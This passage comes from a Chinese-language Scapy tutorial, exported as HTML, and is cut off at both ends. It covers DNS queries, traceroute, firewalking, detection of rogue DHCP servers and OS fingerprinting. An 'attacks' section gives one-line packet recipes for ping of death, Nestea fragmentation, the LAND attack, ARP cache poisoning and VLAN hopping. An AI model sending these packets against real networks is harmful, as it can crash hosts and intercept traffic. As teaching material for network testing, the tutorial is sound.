request</span></p><ul><li><code>ans = sr1(IP(dst=&quot;8.8.8.8&quot;)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=&quot;secdev.org&quot;,qtype=&quot;A&quot;)))</code></li><li><code>ans.ns.mname</code></li><li><code>ans.ns.rname</code></li></ul></li><li><p><span>MX request</span></p><ul><li><code>ans = sr1(IP(dst=&quot;8.8.8.8&quot;)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=&quot;google.cn&quot;,qtype=&quot;MX&quot;)))</code></li><li><code>[x.exchange for x in ans.an.iterpayloads()]</code></li></ul></li></ul><h2 id='十六攻击'><span>十六.攻击</span></h2><h3 id='161畸形数据包'><span>16.1.畸形数据包</span></h3><ul><li><code>send(IP(dst=&quot;10.1.1.5&quot;, ihl=2, version=3)/ICMP())</code></li></ul><h3 id='162死亡之ping'><span>16.2.死亡之Ping</span></h3><blockquote><p><span>ping 数据包巨大</span></p></blockquote><ul><li><code>send( fragment(IP(dst=&quot;10.0.0.5&quot;)/ICMP()/(&quot;X&quot;*60000)))</code></li></ul><h3 id='163nestea攻击'><span>16.3.Nestea攻击</span></h3><blockquote><p><span>受到Nestea拒绝服务攻击的计算机几乎肯定会崩溃</span></p></blockquote><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">send</span>(<span class="cm-variable">IP</span>(<span class="cm-variable">dst</span><span class="cm-operator">=</span><span class="cm-variable">target</span>, <span class="cm-builtin">id</span><span class="cm-operator">=</span><span class="cm-number">42</span>, <span class="cm-variable">flags</span><span class="cm-operator">=</span><span class="cm-string">"MF"</span>)<span class="cm-operator">/</span><span class="cm-variable">UDP</span>()<span class="cm-operator">/</span>(<span class="cm-string">"X"</span><span class="cm-operator">*</span><span class="cm-number">10</span>)) </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">send</span>(<span class="cm-variable">IP</span>(<span class="cm-variable">dst</span><span class="cm-operator">=</span><span class="cm-variable">target</span>, <span class="cm-builtin">id</span><span class="cm-operator">=</span><span class="cm-number">42</span>, <span class="cm-variable">frag</span><span class="cm-operator">=</span><span class="cm-number">48</span>)<span class="cm-operator">/</span>(<span class="cm-string">"X"</span><span class="cm-operator">*</span><span class="cm-number">116</span>)) </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">send</span>(<span class="cm-variable">IP</span>(<span class="cm-variable">dst</span><span class="cm-operator">=</span><span class="cm-variable">target</span>, <span class="cm-builtin">id</span><span class="cm-operator">=</span><span class="cm-number">42</span>, <span class="cm-variable">flags</span><span class="cm-operator">=</span><span class="cm-string">"MF"</span>)<span class="cm-operator">/</span><span class="cm-variable">UDP</span>()<span class="cm-operator">/</span>(<span class="cm-string">"X"</span><span class="cm-operator">*</span><span class="cm-number">224</span>))</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 74px;"></div><div class="CodeMirror-gutters" style="display: none; height: 74px;"></div></div></div></pre><h3 id='164地面攻击windwos专用'><span>16.4.地面攻击(Windwos专用)</span></h3><ul><li><code>send(IP(src=target,dst=target)/TCP(sport=135,dport=135))</code></li></ul><h3 id='165arp缓存毒化'><span>16.5.ARP缓存毒化</span></h3><blockquote><p><span>这种攻击通过VLAN跳变攻击来毒化ARP缓存, 从而阻止客户端加入网关</span></p></blockquote><ul><li><p><span>经典的ARP缓存毒化</span></p><ul><li><code>send(Ether(dst=clientMAC)/ARP(op=&quot;who-has&quot;, psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1)</code></li></ul></li><li><p><span>用双802.1q封装的ARP缓存毒化</span></p><ul><li><code>send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2) /ARP(op=&quot;who-has&quot;, psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1)</code></li></ul></li></ul><h3 id='166etherleaking'><span>16.6.Ether_leaking</span></h3><blockquote><p><span>Exploit Etherleak flaw, 网络设备驱动程序在对于小于46字节的包数据会进行填补. 多个网络设备驱动程序在填补数据包时使用以前的帧缓冲数据, 远程攻击者可以利用这个漏洞从受此漏洞影响的设备中获得一些敏感信息. Ethernet标准(IEEE 802.3)定义数据包的最小字段为46字节, 如果高层协议如IP提供的数据包小于46字节, 设备驱动程序必须填充数据段来迎合IEEE 802规定的最小帧大小规定, 而填充值一般是NULL数据. 但是许多Ethernet设备驱动程序没有正确按照标准实现进行操作, 对数据的填充没有使用NULL字节, 而重用了以前传输过的帧数据进行填补操作. 由于Ethernet帧缓冲区在内核内存空间分配, 因此通过分析这些填补数据可以获得一些系统敏感信息. </span></p></blockquote><ul><li><code>sr1(IP(dst=&quot;172.16.1.232&quot;)/ICMP())</code></li></ul><h3 id='167icmpleaking'><span>16.7.ICMP_leaking</span></h3><blockquote><p><span>这是一个Linux 2.0的bug</span></p></blockquote><ul><li><code>sr1(IP(dst=&quot;172.16.1.1&quot;, options=&quot;\x02&quot;)/ICMP())</code></li></ul><h3 id='168vlan跳跃'><span>16.8.VLAN跳跃</span></h3><blockquote><p><span>在非常特殊的情况下, 双802.1q封装将使包跳转到另一个VLAN</span></p></blockquote><ul><li><code>sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())</code></li></ul><h3 id='169无线网嗅探'><span>16.9.无线网嗅探</span></h3><blockquote><p><span>下面的命令将显示类似于大多数无线嗅探器的信息</span></p></blockquote><ul><li><code>sniff(iface=&quot;mon0&quot;, monitor=True, prn=lambda x:x.sprintf(&quot;Dot11Beacon:%Dot11.addr3%\t%Dot11Beacon.info%\t%PrismHeader.channel%\t%Dot11Beacon.cap%&quot;))</code></li></ul><h2 id='十七路由跟踪'><span>十七.路由跟踪</span></h2><h3 id='171tcpsyn路由跟踪'><span>17.1.TCP_SYN路由跟踪</span></h3><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; ans, unans = sr(IP(dst="4.2.2.1",ttl=(1,10))/TCP(dport=53,flags="S"))</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}")) </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">192.168.1.1 time-exceeded </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">68.86.90.162 time-exceeded </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4.79.43.134 time-exceeded </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4.79.43.133 time-exceeded </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4.68.18.126 time-exceeded </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4.68.123.38 time-exceeded </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4.2.2.1 SA</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 222px;"></div><div class="CodeMirror-gutters" style="display: none; height: 222px;"></div></div></div></pre><h3 id='172udp路由跟踪'><span>17.2.UDP路由跟踪</span></h3><blockquote><p><span>因为UDP没有三次握手, 所以我们需要给一个应用负载(DNS, ISAKMP, NTP等)获得的响应</span></p></blockquote><ul><li><code>ans, unans = sr(IP(dst=&#39;dns server&#39;, ttl=(1,20)) /UDP()/DNS(qd=DNSQR(qname=&quot;google.cn&quot;)))</code></li><li><code>ans.make_table(lambda x: (x[0].dst, x[0].ttl, x[1].src))</code></li></ul><h3 id='173dns路由跟踪'><span>17.3.DNS路由跟踪</span></h3><ul><li><code>ans, unans = traceroute(&quot;4.2.2.1&quot;,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname=&quot;thesprawl.org&quot;)))</code></li></ul><h2 id='十八技巧'><span>十八.技巧</span></h2><h3 id='181简单的arp监控'><span>18.1.简单的ARP监控</span></h3><blockquote><p><span>这个程序使用了回调函数(参数prn). store参数被设置为0, 这样一来, sniff()函数就不会存储任何东西, 因此可以永远运行. 过滤器参数用于在高负载下获得更好的性能:过滤器应用于内核内部, Scapy只会看到ARP流量. </span></p></blockquote><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">from</span> <span class="cm-variable">scapy</span>.<span class="cm-property">all</span> <span class="cm-keyword">import</span> <span class="cm-operator">*</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">def</span> <span class="cm-def">arp_monitor_callback</span>(<span class="cm-variable">pkt</span>): </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">if</span> <span class="cm-variable">ARP</span> <span class="cm-keyword">in</span> <span class="cm-variable">pkt</span> <span class="cm-keyword">and</span> <span class="cm-variable">pkt</span>[<span class="cm-variable">ARP</span>].<span class="cm-property">op</span> <span class="cm-keyword">in</span> (<span class="cm-number">1</span>,<span class="cm-number">2</span>): <span class="cm-comment">#who-has or is-at </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">pkt</span>.<span class="cm-property">sprintf</span>(<span class="cm-string">"%ARP.hwsrc% %ARP.psrc%"</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">sniff</span>(<span class="cm-variable">prn</span><span class="cm-operator">=</span><span class="cm-variable">arp_monitor_callback</span>, <span class="cm-builtin">filter</span><span class="cm-operator">=</span><span class="cm-string">"arp"</span>, <span class="cm-variable">store</span><span class="cm-operator">=</span><span class="cm-number">0</span>)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 123px;"></div><div class="CodeMirror-gutters" style="display: none; height: 123px;"></div></div></div></pre><h3 id='182识别局域网中的恶意dhcp服务器'><span>18.2.识别局域网中的恶意DHCP服务器</span></h3><ul><li><p><span>问题</span></p><ul><li><span>您怀疑有人在您的LAN上安装了一个额外的、未经授权的DHCP服务器——可能是无意的, 也可能是恶意的. 因此, 您需要检查任何活动的DHCP服务器, 并确定它们的IP和MAC地址</span></li></ul></li><li><p><span>办法</span></p><ul><li><p><span>使用Scapy发送一个DHCP发现请求并分析回复:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">checkIPaddr</span> <span class="cm-operator">=</span> <span class="cm-keyword">False</span> </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">fam</span>,<span class="cm-variable">hw</span> <span class="cm-operator">=</span> <span class="cm-variable">get_if_raw_hwaddr</span>(<span class="cm-variable">conf</span>.<span class="cm-property">iface</span>) </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">dhcp_discover</span> <span class="cm-operator">=</span> <span class="cm-variable">Ether</span>(<span class="cm-variable">dst</span><span class="cm-operator">=</span><span class="cm-string">"ff:ff:ff:ff:ff:ff"</span>)<span class="cm-operator">/</span><span class="cm-variable">IP</span>(<span class="cm-variable">src</span><span class="cm-operator">=</span><span class="cm-string">"0.0.0.0"</span>,<span class="cm-variable">dst</span><span class="cm-operator">=</span><span class="cm-string">"255.255.255.255"</span>)<span class="cm-operator">/</span><span class="cm-variable">UDP</span>(<span class="cm-variable">sport</span><span class="cm-operator">=</span><span class="cm-number">68</span>,<span class="cm-variable">dport</span><span class="cm-operator">=</span><span class="cm-number">67</span>)<span class="cm-operator">/</span><span class="cm-variable">BOOTP</span>(<span class="cm-variable">chaddr</span><span class="cm-operator">=</span><span class="cm-variable">hw</span>)<span class="cm-operator">/</span><span class="cm-variable">DHCP</span>(<span class="cm-variable">options</span><span class="cm-operator">=</span>[(<span class="cm-string">"message-type"</span>,<span class="cm-string">"discover"</span>),<span class="cm-string">"end"</span>]) </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">ans</span>, <span class="cm-variable">unans</span> <span class="cm-operator">=</span> <span class="cm-variable">srp</span>(<span class="cm-variable">dhcp_discover</span>, <span class="cm-variable">multi</span><span class="cm-operator">=</span><span class="cm-keyword">True</span>) </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 173px;"></div><div class="CodeMirror-gutters" style="display: none; height: 173px;"></div></div></div></pre></li><li><p><span>在本例中, 我们得到了两个应答, 因此测试网络上有两个活动的DHCP服务器</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">ans</span>.<span class="cm-property">summary</span>() </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Ether</span> <span class="cm-operator">/</span> <span class="cm-variable">IP</span> <span class="cm-operator">/</span> <span class="cm-variable">UDP</span> <span class="cm-number">0.0.0.0</span>:<span class="cm-variable">bootpc</span> <span class="cm-operator">&gt;</span> <span class="cm-number">255.255.255.255</span>:<span class="cm-variable">bootps</span> <span class="cm-operator">/</span> <span class="cm-variable">BOOTP</span> <span class="cm-operator">/</span> <span class="cm-variable">DHCP</span> <span class="cm-operator">==&gt;</span><span class="cm-variable">Ether</span> <span class="cm-operator">/</span> <span class="cm-variable">IP</span> <span class="cm-operator">/</span> <span class="cm-variable">UDP</span> <span class="cm-number">192.168.1.1</span>:<span class="cm-variable">bootps</span> <span class="cm-operator">&gt;</span> <span class="cm-number">255.255.255.255</span>:<span class="cm-variable">bootpc</span> <span class="cm-operator">/</span> <span class="cm-variable">BOOTP</span> <span class="cm-operator">/</span> <span class="cm-variable">DHCP</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Ether</span> <span class="cm-operator">/</span> <span class="cm-variable">IP</span> <span class="cm-operator">/</span> <span class="cm-variable">UDP</span> <span class="cm-number">0.0.0.0</span>:<span class="cm-variable">bootpc</span> <span class="cm-operator">&gt;</span> <span class="cm-number">255.255.255.255</span>:<span class="cm-variable">bootps</span> <span class="cm-operator">/</span> <span class="cm-variable">BOOTP</span> <span class="cm-operator">/</span> <span class="cm-variable">DHCP</span> <span class="cm-operator">==&gt;</span><span class="cm-variable">Ether</span> <span class="cm-operator">/</span> <span class="cm-variable">IP</span> <span class="cm-operator">/</span> <span class="cm-variable">UDP</span> <span class="cm-number">192.168.1.11</span>:<span class="cm-variable">bootps</span> <span class="cm-operator">&gt;</span> <span class="cm-number">255.255.255.255</span>:<span class="cm-variable">bootpc</span> <span class="cm-operator">/</span> <span class="cm-variable">BOOTP</span> <span class="cm-operator">/</span> <span class="cm-variable">DHCP</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-keyword">for</span> <span class="cm-variable">p</span> <span class="cm-keyword">in</span> <span class="cm-variable">ans</span>: <span class="cm-builtin">print</span> <span class="cm-variable">p</span>[<span class="cm-number">1</span>][<span class="cm-variable">Ether</span>].<span class="cm-property">src</span>, <span class="cm-variable">p</span>[<span class="cm-number">1</span>][<span class="cm-variable">IP</span>].<span class="cm-property">src</span> </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre></li></ul></li></ul><h3 id='183firewalking'><span>18.3.Firewalking</span></h3><ul><li><p><span>过滤操作后的TTL递减, 只有未过滤的包生成超过ICMP TTL</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">ans</span>, <span class="cm-variable">unans</span> <span class="cm-operator">=</span> <span class="cm-variable">sr</span>(<span class="cm-variable">IP</span>(<span class="cm-variable">dst</span><span class="cm-operator">=</span><span class="cm-string">"172.16.4.27"</span>, <span class="cm-variable">ttl</span><span class="cm-operator">=</span><span class="cm-number">16</span>)<span class="cm-operator">/</span><span class="cm-variable">TCP</span>(<span class="cm-variable">dport</span><span class="cm-operator">=</span>(<span class="cm-number">1</span>,<span class="cm-number">1024</span>))) </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-keyword">for</span> <span class="cm-variable">s</span>,<span class="cm-variable">r</span> <span class="cm-keyword">in</span> <span class="cm-variable">ans</span>: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> <span class="cm-variable">r</span>.<span class="cm-property">haslayer</span>(<span class="cm-variable">ICMP</span>) <span class="cm-keyword">and</span> <span class="cm-variable">r</span>.<span class="cm-property">payload</span>.<span class="cm-property">type</span> <span class="cm-operator">==</span> <span class="cm-number">11</span>: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">print</span> (<span class="cm-variable">s</span>.<span class="cm-property">dport</span>)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 99px;"></div><div class="CodeMirror-gutters" style="display: none; height: 99px;"></div></div></div></pre></li><li><p><span>发现子网在一个多网卡防火墙中, 用这个TTl, 只有防火墙的网卡的IP是可达的</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Pyhton"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="pyhton"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; ans, unans = sr(IP(dst="172.16.5/24", ttl=15)/TCP()) </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; for i in unans: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  print i.dst</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 74px;"></div><div class="CodeMirror-gutters" style="display: none; height: 74px;"></div></div></div></pre></li></ul><h3 id='184tcp时间戳过滤'><span>18.4.TCP时间戳过滤</span></h3><ul><li><p><span>问题</span></p><ul><li><span>许多防火墙包含一个规则来删除没有设置TCP时间戳选项的TCP包, 这在流行的端口扫描器中很常见. </span></li></ul></li><li><p><span>办法</span></p><ul><li><span>为了让Scapy到达目标目的地, 必须使用其他选项</span></li><li><code>sr1(IP(dst=&quot;72.14.207.99&quot;)/TCP(dport=80,flags=&quot;S&quot;,options=[(&#39;Timestamp&#39;,(0,0))]))</code></li></ul></li></ul><h3 id='185使用wireshark查看包'><span>18.5.使用Wireshark查看包</span></h3><ul><li><p><span>问题</span></p><ul><li><span>您已经用Scapy生成或嗅探了一些包. 现在你想用Wireshark来查看它们, 因为它有先进的分组分析能力</span></li></ul></li><li><p><span>办法</span></p><ul><li><code>packets = IP(src=&quot;192.0.2.9&quot;, dst=Net(&quot;192.0.2.10/30&quot;))/ICMP()</code></li><li><code>wireshark(packets)</code></li></ul></li></ul><h3 id='186操作系统识别'><span>18.6.操作系统识别</span></h3><ul><li><p><span>ISN</span></p><ul><li><p><span>Scapy可用于分析ISN(初始序列号)增量, 从而可能发现易受攻击的系统. 首先, 我们通过循环发送SYN探针,收集目标的响应</span></p><ul><li><code>ans, unans = srloop(IP(dst=&quot;192.168.1.1&quot;)/TCP(dport=80,flags=&quot;S&quot;))</code></li></ul></li><li><p><span>一旦我们获得了合理数量的响应, 我们就可以开始用类似这样的方法分析收集到的数据</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 